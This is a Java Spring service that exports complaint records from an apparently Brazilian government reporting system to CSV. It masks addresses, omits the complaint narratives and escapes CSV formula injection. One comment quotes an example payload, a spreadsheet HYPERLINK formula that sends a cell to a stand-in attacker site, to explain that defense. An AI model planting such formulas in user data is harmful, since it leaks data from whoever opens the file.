package br.gov.protege.service;

import br.gov.protege.model.Denuncia;
import br.gov.protege.util.MascaraUtil;
import org.springframework.stereotype.Service;

import java.time.format.DateTimeFormatter;
import java.util.List;

/**
 * Exportacao das denuncias em CSV.
 *
 * Exportar e a operacao que mais expoe dado no sistema: em vez de uma
 * consulta por vez, num contexto controlado, o conteudo sai do sistema de
 * uma vez e passa a viver numa planilha que ninguem mais controla. Por isso
 * a exportacao e restrita a GESTOR e ADMIN, gera trilha de auditoria e
 * respeita o mesmo mascaramento das telas.
 *
 * O que a exportacao NAO leva
 * ---------------------------
 * O relato. Um arquivo com centenas de relatos de violencia circulando por
 * e-mail e exatamente o vazamento que todo o resto do sistema tenta evitar.
 * A exportacao serve para analise de gestao - volume, tipo, prazo, situacao -
 * e nenhuma dessas perguntas precisa do texto da denuncia.
 */
@Service
public class ExportacaoService {

    private static final DateTimeFormatter DATA_HORA =
            DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm");

    private static final String CABECALHO =
            "protocolo;tipo;status;uf;municipio;endereco;anonima;score;classificacao;"
            + "urgencia_ia;origem_analise;responsavel_id;criado_em;concluida_em;dias_ate_concluir";

    /**
     * Monta o CSV.
     *
     * @param podeVerIdentidade quando falso, o endereco sai mascarado - a
     *                          mesma regra que vale na tela vale no arquivo.
     *                          Nao faria sentido negar o endereco no detalhe
     *                          e entrega-lo em lote numa planilha.
     */
    public String gerarCsv(List<Denuncia> denuncias, boolean podeVerIdentidade) {
        StringBuilder sb = new StringBuilder();
        // BOM: sem ele o Excel abre o arquivo com a acentuacao quebrada.
        // Escrito como escape em vez do caractere literal - um caractere
        // invisivel no codigo-fonte e uma armadilha para quem edita depois.
        sb.append('\uFEFF');
        sb.append(CABECALHO).append("\r\n");

        for (Denuncia d : denuncias) {
            String endereco = podeVerIdentidade
                    ? d.getEndereco()
                    : MascaraUtil.endereco(d.getEndereco());

            sb.append(String.join(";",
                    campo(d.getProtocolo()),
                    campo(d.getTipo()),
                    campo(d.getStatus()),
                    campo(d.getEstado()),
                    campo(d.getCidade()),
                    campo(endereco),
                    campo(d.isAnonimo() ? "sim" : "nao"),
                    campo(String.valueOf(d.getScore())),
                    campo(d.getScoreTxt()),
                    campo(d.getUrgenciaIa()),
                    campo(d.getOrigemAnalise()),
                    campo(d.getResponsavelId() == null ? "" : String.valueOf(d.getResponsavelId())),
                    campo(d.getCriadoEm() == null ? "" : DATA_HORA.format(d.getCriadoEm())),
                    campo(d.getConcluidaEm() == null ? "" : DATA_HORA.format(d.getConcluidaEm())),
                    campo(diasAteConcluir(d))
            )).append("\r\n");
        }
        return sb.toString();
    }

    private String diasAteConcluir(Denuncia d) {
        if (d.getCriadoEm() == null || d.getConcluidaEm() == null) return "";
        double dias = java.time.Duration.between(d.getCriadoEm(), d.getConcluidaEm())
                .toSeconds() / 86400.0;
        return String.format(java.util.Locale.forLanguageTag("pt-BR"), "%.2f", dias);
    }

    /**
     * Escapa um campo de CSV e neutraliza injecao de formula.
     *
     * Um valor que comeca com =, +, - ou @ e interpretado como FORMULA pelo
     * Excel e pelo LibreOffice ao abrir o arquivo. Um denunciante que
     * escrevesse o nome de uma rua como
     *
     *     =HYPERLINK("http://sitedele/?d="&A1;"clique")
     *
     * faria a planilha do servidor publico exfiltrar a linha ao ser clicada.
     * O ataque nao acontece na API: acontece na maquina de quem abre o
     * arquivo, dias depois, e por isso passa despercebido com facilidade.
     *
     * A defesa e prefixar com apostrofo, que forca o Excel a tratar o valor
     * como texto. O usuario ve o conteudo original; a planilha nao o executa.
     */
    static String campo(String valor) {
        if (valor == null || valor.isBlank()) return "";
        String v = valor;

        // Quebra de linha dentro de celula desalinha o arquivo inteiro.
        v = v.replace("\r", " ").replace("\n", " ");

        if (v.startsWith("=") || v.startsWith("+") || v.startsWith("-")
                || v.startsWith("@") || v.startsWith("\t")) {
            v = "'" + v;
        }
        // Aspas duplas viram duplicadas, e o campo inteiro vai entre aspas.
        v = v.replace("\"", "\"\"");
        return "\"" + v + "\"";
    }
}
